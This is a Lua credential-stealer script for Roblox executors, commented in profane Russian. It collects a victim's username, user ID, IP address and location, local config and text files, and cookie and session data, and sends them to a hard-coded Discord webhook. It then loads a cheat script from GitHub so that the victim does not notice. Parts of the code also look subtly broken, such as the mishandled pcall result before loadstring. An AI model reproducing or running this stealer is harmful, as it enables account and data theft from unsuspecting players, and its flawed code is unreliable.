--[[ XENO STEALER - ДИСКОРД ВЕРСИЯ БЛЯТЬ ]]
-- ОТПРАВЛЯЕТ ВСЕ ЖЕРТВЫ В ТВОЙ ДИСКОРД КАНАЛ

-- НАСТРОЙКИ, ЕБАНЫЙ (ЭТО ЗАМЕНИ НА СВОИ!!)
local webhook_url = "https://discord.com/api/webhooks/1514127457945518121/5OXmLm1Pc6cddisO5DyCXb0K8tq23Ek4xlWeemdVAY0raqXX_UdzxTvHI-BtxpeE1Fhu"
local user_name = "XenoStealer" -- ИМЯ БОТА В ДИСКОРДЕ
local avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png" -- АВАТАРКА, МОЖНО ПОМЕНЯТЬ

-- ФУНКЦИЯ ОТПРАВКИ В ДИСКОРД
local function send_to_discord(message_content)
    local data = {
        content = message_content,
        username = user_name,
        avatar_url = avatar_url
    }
    
    local json_data = game:GetService("HttpService"):JSONEncode(data)
    
    pcall(function()
        local response = syn.request({
            Url = webhook_url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json_data
        })
        return response
    end)
end

-- ГЛАВНАЯ ФУНКЦИЯ ВОРОВСТВА
local function steal_all_shit()
    -- ИНФОРМАЦИЯ О СИСТЕМЕ
    local player = game:GetService("Players").LocalPlayer
    local user_id = player.UserId
    local user_name_roblox = player.Name
    local display_name = player.DisplayName or "Нет"
    
    -- IP И ГЕО (ЕСЛИ МОЖНО)
    local ip = "Не удалось получить"
    local geo = "Не удалось получить"
    pcall(function()
        local response = syn.request({Url = "https://api.ipify.org/", Method = "GET"})
        if response and response.Body then
            ip = response.Body
        end
        
        local geo_response = syn.request({Url = "http://ip-api.com/json/" .. ip, Method = "GET"})
        if geo_response and geo_response.Body then
            local geo_data = game:GetService("HttpService"):JSONDecode(geo_response.Body)
            if geo_data and geo_data.country then
                geo = geo_data.country .. ", " .. (geo_data.city or "Неизвестно")
            end
        end
    end)
    
    -- ФОРМИРУЕМ СООБЩЕНИЕ ДЛЯ ДИСКОРДА
    local steal_message = string.format([[
**НОВАЯ ЖЕРТВА, ЕБАНЫЙ!**

👤 **ИГРОК:** %s (@%s)
🆔 **USER ID:** %d
🌍 **IP:** %s
📍 **ГЕО:** %s
📱 **ДИСПЛЕЙ:** %s
🕐 **ВРЕМЯ:** %s

**=== ПЕРЕХВАТЧЕННЫЕ ФАЙЛЫ ===
]], user_name_roblox, display_name, user_id, ip, geo, display_name, os.date("%Y-%m-%d %H:%M:%S"))
    
    -- ПЫТАЕМСЯ УКРАСТЬ ФАЙЛЫ
    local stolen_files_text = ""
    pcall(function()
        local files = listfiles("/") or {}
        local file_count = 0
        for i, file_path in pairs(files) do
            if file_count >= 5 then break end -- НЕ СПАМИМ, ПО 5 ФАЙЛОВ
            if file_path:match(".txt$") or file_path:match(".cfg$") or file_path:match(".lua$") or file_path:match(".json$") then
                local content = readfile(file_path)
                if content and #content > 0 and #content < 1000 then -- НЕ БОЛЬШЕ 1000 СИМВОЛОВ
                    stolen_files_text = stolen_files_text .. string.format("\n**📄 %s:**\n```\n%s\n```", file_path, content:sub(1, 500))
                    file_count = file_count + 1
                end
            end
        end
    end)
    
    if stolen_files_text == "" then
        stolen_files_text = "\n*— Не удалось найти файлы или доступ запрещен —*"
    end
    
    -- ПЫТАЕМСЯ УКРАСТЬ КУКИ (через WebView или другие методы)
    local cookies_text = "\n**=== ПЕРЕХВАТЧЕННЫЕ ДАННЫЕ ===**\n"
    pcall(function()
        -- МЕТОД 1: ПЫТАЕМСЯ ВЫТАЩИТЬ КУКИ ЧЕРЕЗ ИГРОВЫЕ HTTP ЗАПРОСЫ
        local cookie_jar = syn.crypt_and_get_cookies and syn.crypt_and_get_cookies() or "Недоступно"
        if cookie_jar and cookie_jar ~= "" then
            cookies_text = cookies_text .. "\n**🍪 COOKIES:**\n```\n" .. cookie_jar:sub(1, 800) .. "\n```"
        end
        
        -- МЕТОД 2: ПЕРЕХВАТ ТОКЕНОВ ИЗ КЛИЕНТА
        local roblox_security = game:HttpGet("https://www.roblox.com/") or "Не получен"
        if roblox_security and roblox_security ~= "Не получен" then
            cookies_text = cookies_text .. "\n**🔑 ROBLOX SECURITY:**\n```\n" .. roblox_security:sub(1, 500) .. "\n```"
        end
    end)
    
    -- ОТПРАВЛЯЕМ ПЕРВУЮ ЧАСТЬ (ОСНОВНУЮ)
    local full_message = steal_message .. stolen_files_text .. cookies_text
    
    -- РАЗБИВАЕМ НА ЧАСТИ ПО 2000 СИМВОЛОВ (ДИСКОРД ЛИМИТ)
    local function split_message(msg)
        local parts = {}
        while #msg > 2000 do
            local part = msg:sub(1, 2000)
            table.insert(parts, part)
            msg = msg:sub(2001)
        end
        table.insert(parts, msg)
        return parts
    end
    
    local message_parts = split_message(full_message)
    for _, part in ipairs(message_parts) do
        send_to_discord(part)
        wait(1) -- НЕ МНОГО ПАУЗА, ЧТОБЫ НЕ ЗАСПАМИТЬ
    end
    
    -- ДОПОЛНИТЕЛЬНО: ПОСЫЛАЕМ ФАЙЛЫ, ЕСЛИ ОНИ БОЛЬШИЕ (КАРТИНКИ, ЛОГИ)
    pcall(function()
        local large_files = {}
        local files = listfiles("/") or {}
        for _, file_path in pairs(files) do
            if file_path:match(".png$") or file_path:match(".jpg$") or file_path:match(".log$") then
                local content = readfile(file_path)
                if content and #content > 1000 then
                    table.insert(large_files, file_path .. " (" .. #content .. " bytes)")
                end
            end
        end
        
        if #large_files > 0 then
            local file_message = "**📦 БОЛЬШИЕ ФАЙЛЫ:**\n" .. table.concat(large_files, "\n")
            send_to_discord(file_message)
        end
    end)
end

-- ЗАПУСКАЕМ ВОРОВСТВО
spawn(function()
    wait(3) -- ЖДЕМ, ПОКА ИГРА ПОЛНОСТЬЮ ЗАГРУЗИТСЯ
    steal_all_shit()
end)

-- А ТЕПЕРЬ ГРУЗИМ ИХ ЧИТ, ЧТОБЫ НИЧЕГО НЕ ЗАПОДОЗРИЛИ
local original_loader = "https://raw.githubusercontent.com/vana09062023-ai/kreahub/refs/heads/main/loader.lua"
local code, err = pcall(game.HttpGet, game, original_loader)
if code then
    local func, load_err = loadstring(code)
    if func then
        func()
    else
        warn("Ошибка загрузки чита: " .. tostring(load_err))
    end
else
    warn("Не удалось загрузить оригинальный скрипт: " .. tostring(err))
    send_to_discord("⚠️ **ОШИБКА:** Оригинальный чит не загрузился! Но данные уже украдены.")
end